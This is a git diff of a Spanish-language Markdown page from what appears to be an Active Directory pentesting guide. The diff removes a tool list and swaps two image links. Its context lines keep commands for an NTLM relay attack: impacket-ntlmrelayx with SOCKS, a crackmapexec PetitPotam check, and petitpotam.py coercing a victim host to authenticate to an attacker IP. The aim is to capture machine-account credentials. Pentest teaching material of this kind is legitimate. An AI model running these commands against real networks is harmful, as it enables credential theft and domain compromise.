@@ -1,7 +1,7 @@
 # Coercionar a la Víctima con PetitPotam
 
 Si la vítima es vulnerable a petit potam podemos capturar las credenciales de la cuenta del equipo utilizando la técnica de NTLM RELAY:
-[NTLM_relay](no_credentials/NTLM_relay/): _Crackmapexec | Responder | ntlmrelayx | Proxychains | Impacket-secretsdump | lsassy | DonPAPI | impacket-smbclient | impacket-smbexec_
+[NTLM_relay](no_credentials/NTLM_relay/)
 
 ```Bash
 # Obtener dispositivos con el SMB sin firmar
@@ -11,7 +11,7 @@ impacket-ntlmrelayx -tf <output equipos relay> -of netntlm -smb2support -socks
 # Insertar el comando "socks" en la misma terminal para obtener las autenticaciones capturadas
 ```
 
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/petitpotam/petitpotam2.png?raw=true "NTLM relay petitpotam")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/petitpotam/petitpotam1.png?raw=true "NTLM relay petitpotam")
 
 ```Bash
 # Comprobar si la víctima es vulnerable a petitpotam con crackmapexec
@@ -20,7 +20,7 @@ poetry run crackmapexec smb <Rango IP> -M petitpotam
 python petitpotam.py <IP atacante> <DNS del equipo vísctima>
 ```
 
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/petitpotam/petitpotam1.png?raw=true "petitpotam")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/petitpotam/petitpotam2.png?raw=true "petitpotam")
 
 Resultad: (para ver las sesiones escribir "socks")
 
